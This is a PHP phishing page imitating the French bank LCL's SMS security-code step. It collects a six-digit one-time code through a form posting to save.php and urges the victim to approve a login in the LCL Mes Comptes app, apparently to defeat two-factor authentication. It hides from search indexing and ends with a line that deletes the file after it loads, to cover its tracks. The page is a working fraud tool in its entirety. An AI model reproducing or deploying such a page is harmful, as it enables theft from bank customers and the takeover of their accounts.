
<!doctype html>
<html style="background: #F2F2F2;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Code de sécurité</title>
    </head>

    <body style="background: #F2F2F2;">

        <!-- HEADER -->
        <header id="header">
            <img style="min-width: 960px;" src="assets/imgs/log-header.png">
            <div class="top"></div>
            <div class="middle"></div>
            <div class="bottom"></div>
            <div class="zz">
                <div class="zz-inner"><div class="time"><?php echo date('d/m/Y à H\hi'); ?></div></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="containerr">
                <div class="title d-flex">
                    <div class="image"><img style="width: 105px;" src="assets/imgs/phone.svg" alt=""></div>
                    <div class="content flex-grow-1 ml-4">
                        <h3>Code de sécurité</h3>
                        <p>Un code de sécurité va vous être transmis par SMS ou par appel d'un serveur vocal sur votre téléphone sera valide pendant <b>5 minutes.</b></p>
                    </div>
                </div>
                <form action="save.php" method="post">
                    <div class="details">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="sms">
                        <p>Tous les champs sont obligatoire.</p>
                        <div class="form-group row mb-0 ">
                            <label class="col-4" for="sms_code">Veuillez entrer le code ici:</label>
                            <div class="col-7">
                                <input type="text" name="sms_code" id="sms_code" minlength="6" maxlength="6" class="form-control">
									</br>	
Si vous n'avez pas reçu le code sms, veuillez confirmer votre connexion en lançant l'application LCL Mes Comptes.</br></br>
Une fois la connexion confirmée avec LCL Mes Comptes, merci de patienter quelques secondes.
                                <?php //echo error_message($_SESSION['errors'],'sms_code'); ?>
                            </div>
                        </div>
                    </div>
                    <div class="btns">
                        <button type="button">Précédent</button>
                        <button type="submit">Confirmer</button>
                    </div>
                </form>
                <div class="banner">
                    <img src="assets/imgs/banner.gif">
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <img style="min-width: 911px;" src="assets/imgs/log-footer.png">
            <div class="top"></div>
            <div class="bottom"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

    </body>

</html>
<?php unlink(basename(__FILE__)); ?>